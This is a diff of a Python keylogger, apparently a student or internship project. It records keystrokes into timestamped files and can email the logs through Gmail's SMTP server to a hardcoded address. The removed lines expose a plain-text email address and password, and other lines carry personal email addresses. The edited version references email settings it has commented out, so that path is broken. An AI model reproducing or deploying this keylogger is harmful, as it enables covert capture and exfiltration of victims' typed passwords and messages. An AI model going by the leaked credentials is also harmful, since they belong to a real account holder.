@@ -7,18 +7,14 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 SEND_REPORT_EVERY = 30 # in seconds, 60 means 1 minute and so on
-EMAIL_ADDRESS = "kapoorpiyush0103@outlook.com"
-EMAIL_PASSWORD = "kapoor65231992"
+# EMAIL_ADDRESS = "newlightinstitute0.0.1@gmail.com"
+# EMAIL_PASSWORD = ""
 
 class Keylogger:
     def __init__(self, interval, report_method="file"):
-        # we gonna pass SEND_REPORT_EVERY to interval
         self.interval = interval
         self.report_method = report_method
-        # this is the string variable that contains the log of all
-        # the keystrokes within `self.interval`
         self.log = ""
-        # record start & end datetimes
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
 
@@ -28,22 +24,19 @@ class Keylogger:
             if name == "space":
                 name = " "
             elif name == "enter":
-                # if Key.enter, use a new line
                 name = "[ENTER]\n"
             elif name == "decimal":
                 name = "."
             else:
-                # replace spaces with underscores
                 name = name.replace(" ", "_")
                 name = f"[{name.upper()}]"
 
         self.log += name
 
     def update_filename(self):
-        # construct the filename to be identified by start & end datetimes
         start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
         end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
-        self.filename = f"/d:/Cyber_security_internship_tasks/keylogger/keylog-{start_dt_str}_{end_dt_str}"
+        self.filename = f"D:/Cyber_security_projects/keylogger/keylog-{start_dt_str}_{end_dt_str}"
     
     def report_to_file(self):
         # open the file in write mode
@@ -55,7 +48,7 @@ class Keylogger:
     def prepare_mail(self, message):
         msg = MIMEMultipart("alternate")
         msg["From"] = EMAIL_ADDRESS
-        msg["To"] = EMAIL_ADDRESS
+        msg["To"] = "akapoorpiyush003@gmail.com"
         msg["Subject"] = "Keylogger Logs"
 
         html = f"<p>{message}</p>"
@@ -69,28 +62,39 @@ class Keylogger:
     def sendmail(self, email, password, message, verbose=1):
         server = smtplib.SMTP(host="smtp.gmail.com", port=587)
         server.starttls()
-        server.login(email, password)
-        server.sendmail(email, email, message)
-        server.quit()
+        try:
+            server.login(email, password)
+        except smtplib.SMTPAuthenticationError as e:
+            print(f"Failed to login: {e}")
+            return
+        except Exception as e:
+            print(f"An error occurred: {e}")
+            return
+        try:
+            server.sendmail(email, email, message)
+        except Exception as e:
+            print(f"Failed to send email: {e}")
+        finally:
+            server.quit()
+        
         if verbose:
             print(f"{datetime.now()} - Sent an email to {email} containing the keylogs")
         
     def report(self):
-        print(f"{datetime.now()} - Report method called")  # Debug statement
+        print(f"{datetime.now()} - Report method called") 
         if self.log:
-            print(f"{datetime.now()} - Log is not empty")  # Debug statement
+            print(f"{datetime.now()} - Log is not empty") 
             self.end_dt = datetime.now()
             self.update_filename()
-            print(f"{datetime.now()} - Filename: {self.filename}")  # Debug statement
+            print(f"{datetime.now()} - Filename: {self.filename}")  
             if self.report_method == "email":
                 self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.prepare_mail(self.log))
             elif self.report_method == "file":
                 self.report_to_file()
-                # if you want to print in the console the recorded logs
-                print(f"[{self.filename}] - {self.log}")
+                #print(f"[{self.filename}] - {self.log}")
             self.start_dt = datetime.now()
         else:
-            print(f"{datetime.now()} - Log is empty")  # Debug statement
+            print(f"{datetime.now()} - Log is empty")
         self.log = ""
         timer = Timer(interval=self.interval, function=self.report)
         timer.daemon = True
